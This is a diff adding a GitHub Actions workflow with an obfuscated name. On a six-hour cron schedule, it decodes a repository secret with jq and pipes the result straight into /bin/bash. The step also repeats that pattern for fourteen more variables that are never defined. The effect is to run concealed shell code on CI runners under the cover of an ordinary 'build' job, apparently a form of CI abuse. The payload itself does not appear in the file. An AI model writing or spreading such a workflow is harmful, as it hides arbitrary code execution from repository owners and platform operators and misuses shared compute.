@@ -1,0 +1,32 @@
+name: qiaosangou8129
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiaosangou8129
+        env:
+          fwlz6: ${{ secrets.fwlz6 }}
+        run: |
+          echo $fwlz6 | jq -r .ch3 | /bin/bash
+          echo $fo25647 | jq -r .vu012 | /bin/bash
+          echo $cqaq2579 | jq -r .whza0 | /bin/bash
+          echo $ef45730 | jq -r .ddd2934 | /bin/bash
+          echo $gqkz438 | jq -r .temra689 | /bin/bash
+          echo $b9287 | jq -r .oaayb0 | /bin/bash
+          echo $niqp02 | jq -r .qof95 | /bin/bash
+          echo $lvnoa5490 | jq -r .hfog2846 | /bin/bash
+          echo $d52290 | jq -r .mblz71903 | /bin/bash
+          echo $gf3 | jq -r .dmd5 | /bin/bash
+          echo $y851 | jq -r .vf35 | /bin/bash
+          echo $o2195 | jq -r .by46 | /bin/bash
+          echo $vi6364 | jq -r .whl44645 | /bin/bash
+          echo $yjb6946 | jq -r .kgnb8 | /bin/bash
+          echo $smzw7034 | jq -r .y2580 | /bin/bash
+
